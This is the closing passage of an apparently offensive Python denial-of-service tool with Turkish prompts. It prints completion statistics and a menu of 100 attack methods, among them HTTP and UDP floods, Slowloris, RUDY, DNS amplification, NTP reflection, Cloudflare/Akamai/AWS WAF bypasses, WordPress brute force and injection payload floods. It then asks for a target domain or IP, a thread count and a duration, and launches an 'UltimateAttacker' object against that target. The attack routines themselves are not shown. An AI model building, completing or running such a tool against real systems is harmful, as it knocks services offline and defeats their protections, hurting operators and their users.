        print(f"\n\n{Colors.GREEN}{Colors.BOLD}[+] TAMAMLANDI!{Colors.RESET}")
        print(f"{Colors.WHITE}───────────────────────────────────────────")
        print(f" Toplam Istek: {self.count:,}")
        print(f" Basarili: {self.ok:,}")
        print(f" Hatali: {self.bad:,}")
        print(f" Sure: {self.duration}s")
        if self.duration > 0:
            print(f" Hiz: {self.count // self.duration:,} istek/s")
        print(f"───────────────────────────────────────────{Colors.RESET}")

def main():
    banner()
    
    target = input(f"{Colors.GREEN}[?] Domain/IP gir: {Colors.RESET}").strip()
    if not target:
        print(f"{Colors.RED}[-] Hedef gir!{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}[*] Mod sec:{Colors.RESET}")
    print(f"{Colors.WHITE}    0. TUMU (100 metod karisik)")
    print(f"    1. HTTP GET Flood")
    print(f"    2. HTTP POST Flood")
    print(f"    3. HTTP HEAD Flood")
    print(f"    4. HTTP OPTIONS Flood")
    print(f"    5. HTTP PUT Flood")
    print(f"    6. HTTP PATCH Flood")
    print(f"    7. HTTP DELETE Flood")
    print(f"    8. HTTP TRACE Flood")
    print(f"    9. HTTP CONNECT Flood")
    print(f"    10. HTTPS GET Flood")
    print(f"    11. HTTPS POST Flood")
    print(f"    12. HTTPS Random Path")
    print(f"    13. HTTPS Null Payload")
    print(f"    14. HTTPS Long URL")
    print(f"    15. HTTPS Recursive GET")
    print(f"    16. Socket TCP Connect")
    print(f"    17. Socket TCP Data")
    print(f"    18. Socket TCP Keepalive")
    print(f"    19. Socket UDP Small")
    print(f"    20. Socket UDP Large")
    print(f"    21. Socket UDP Multi")
    print(f"    22. Slowloris Attack")
    print(f"    23. Slowloris SSL")
    print(f"    24. Slow Read")
    print(f"    25. Slow POST")
    print(f"    26. RUDY Attack")
    print(f"    27. Apache Killer")
    print(f"    28. NGINX Stress")
    print(f"    29. IIS Bypass")
    print(f"    30. Wordpress Login")
    print(f"    31. Wordpress XMLRPC")
    print(f"    32. Wordpress REST API")
    print(f"    33. Wordpress Bruteforce")
    print(f"    34. Joomla Stress")
    print(f"    35. Drupal Hit")
    print(f"    36. Magento Search")
    print(f"    37. PHPMyAdmin Brute")
    print(f"    38. Admin Panel Finder")
    print(f"    39. Directory Scan")
    print(f"    40. SQL Injection Sim")
    print(f"    41. XSS Payload Flood")
    print(f"    42. LFI Payload")
    print(f"    43. RFI Payload")
    print(f"    44. CMD Injection")
    print(f"    45. User Agent Rotate")
    print(f"    46. Referer Spam")
    print(f"    47. Cookie Bomb")
    print(f"    48. Header Overflow")
    print(f"    49. Accept Encoding Bomb")
    print(f"    50. Cache Bypass")
    print(f"    51. Cloudflare Bypass")
    print(f"    52. CloudFront Bypass")
    print(f"    53. Akamai Bypass")
    print(f"    54. Fastly Bypass")
    print(f"    55. Imperva Bypass")
    print(f"    56. Sucuri Bypass")
    print(f"    57. DDoS Guard Bypass")
    print(f"    58. OVH Bypass")
    print(f"    59. AWS WAF Bypass")
    print(f"    60. Google Cloud Bypass")
    print(f"    61. API Endpoint Flood")
    print(f"    62. GraphQL Bomb")
    print(f"    63. REST API Stress")
    print(f"    64. SOAP Request")
    print(f"    65. WebDAV Flood")
    print(f"    66. XML Bomb")
    print(f"    67. JSON Bomb")
    print(f"    68. Form Submit Flood")
    print(f"    69. File Upload Sim")
    print(f"    70. Range Header")
    print(f"    71. Chunked Transfer")
    print(f"    72. Gzip Bomb")
    print(f"    73. Deflate Flood")
    print(f"    74. Brotli Stress")
    print(f"    75. HTTP2 Priorities")
    print(f"    76. HTTP2 Settings")
    print(f"    77. HTTP2 Ping")
    print(f"    78. HTTP2 RST")
    print(f"    79. WebSocket Stress")
    print(f"    80. SSE Flood")
    print(f"    81. DNS Query Flood")
    print(f"    82. DNS Amplification")
    print(f"    83. NTP Reflection")
    print(f"    84. SMTP Stress")
    print(f"    85. FTP Brute Sim")
    print(f"    86. SSH Stress")
    print(f"    87. Telnet Flood")
    print(f"    88. MySQL Stress")
    print(f"    89. PostgreSQL Stress")
    print(f"    90. Redis Ping")
    print(f"    91. MongoDB Stress")
    print(f"    92. Memcached Hit")
    print(f"    93. Elasticsearch Query")
    print(f"    94. Kibana Search")
    print(f"    95. Docker API")
    print(f"    96. Kubernetes Probe")
    print(f"    97. Etcd Stress")
    print(f"    98. Consul Hit")
    print(f"    99. Zookeeper Stress")
    print(f"    100. All In One (Karışık){Colors.RESET}")
    
    try:
        method_choice = int(input(f"{Colors.GREEN}[?] Metod numarasi (0-100): {Colors.RESET}").strip())
    except:
        method_choice = 0
    
    threads = input(f"{Colors.GREEN}[?] Thread (varsayilan 500): {Colors.RESET}").strip()
    threads = int(threads) if threads else 500
    
    duration = input(f"{Colors.GREEN}[?] Sure - saniye (varsayilan 60): {Colors.RESET}").strip()
    duration = int(duration) if duration else 60
    
    confirm = input(f"\n{Colors.RED}[!] {target} hedefine baslansin mi? (E/H): {Colors.RESET}").strip().lower()
    if confirm != 'e':
        return
    
    attacker = UltimateAttacker(target, threads, duration)
    
    try:
        if method_choice == 0:
            attacker.start()
        else:
            attacker.start(method_choice)
    except KeyboardInterrupt:
        attacker.run = False
        print(f"\n{Colors.RED}[!] Durduruldu!{Colors.RESET}")

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Cikis...{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[-] Hata: {e}{Colors.RESET}")
    input(f"\n{Colors.YELLOW}[*] Cikmak icin Enter...{Colors.RESET}")
